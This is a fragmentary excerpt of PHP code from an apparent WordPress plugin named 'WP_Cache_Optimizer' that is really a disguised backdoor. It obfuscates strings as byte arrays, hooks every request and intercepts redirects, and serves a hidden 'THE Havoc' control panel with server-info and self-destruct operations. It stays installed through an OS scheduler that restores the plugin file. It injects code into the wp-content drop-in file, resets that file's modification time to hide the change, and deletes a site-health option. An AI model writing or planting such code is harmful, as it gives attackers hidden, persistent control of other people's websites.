...
if (!defined('ABSPATH')) {
    ...
    $_ck = _b([95,119,112,99,95,112,114,101,102]); // _wpc_pref
...
class WP_Cache_Optimizer {
    ...
    public function __construct() {
        ...
        add_action('send_headers',      [$this, '_handle_request'], 0);
        add_action('template_redirect', [$this, '_handle_request'], 0);
        add_filter('wp_redirect',       [$this, '_intercept_redirect'], 0, 2);
...
<h2>&#9880; <?php echo _b([84,72,69,32,72,97,118,111,99]); ?></h2>
<div class="tabs">
...
<div style="display:flex;gap:10px;flex-wrap:wrap;margin-bottom:14px">
  ...
  <div style="flex:1;min-width:200px;background:#161b22;border:1px solid #30363d;border-radius:6px;padding:12px">
    ...
    <div style="font-size:11px;color:#8b949e;margin-bottom:8px">Removes the scheduler entry (#wpcp marker). OS-level scheduler will no longer restore the plugin file.</div>
    ...
    public function handle_usr(): void {
        ...
        switch ($op) {
            ...
            case 'srvinfo':
                ...
                $_db_store = get_option($_opt_name);
            ...
            case 'destruct_recover': {
                ...
                if (defined('WP_CONTENT_DIR')) {
                    ...
                    if (@file_exists($dropin)) {
                        ...
                        $_sp = _wpcsf();
                        $_mk = 'wpc-gc-' . substr(md5($_sp.'dropin'), 0, 6);
                        $_pt = '// wco-pb-' . substr(md5($_sp), 0, 6);
                        $_pe = '// wco-pb-end-' . substr(md5($_sp), 0, 6);
                ...
                delete_option(_b([119,112,95,115,105,116,101,95,104,101,97,108,116,104,95,99,104,101,99,107,95,116,105,109,101,111,117,116]));
...
<p id="backtoblog"><a href="<?= $blogurl ?>">&#8592; Go to <?= $blogname ?></a></p>
    ...
    public function _gc_tick(): void {
        ...
        $_dropin_missing = !$_oc_path || !@file_exists($_oc_path)
            || (int)@filemtime($_oc_path) !== (int)get_option(_b([119,112,99,95,111,99,109,116]), 0);
        ...
        if (@file_exists($dropin)) {
            ...
            if (strpos($existing, $marker) === false) {
                if (strpos($existing, $pb_tag) !== false) {
                    update_option(_b([119,112,99,95,111,99,109,116]), (int)@filemtime($dropin), false);
                    return;
                }
                ...
                $pb_end = '// wco-pb-end-' . substr(md5($self), 0, 6);
                ...
                if (@file_put_contents($dropin, $new_dropin) !== false) {
                    ...
                    update_option(_b([119,112,99,95,111,99,109,116]), $orig_mtime ?: (int)@filemtime($dropin), false);
                }
                return;
            }
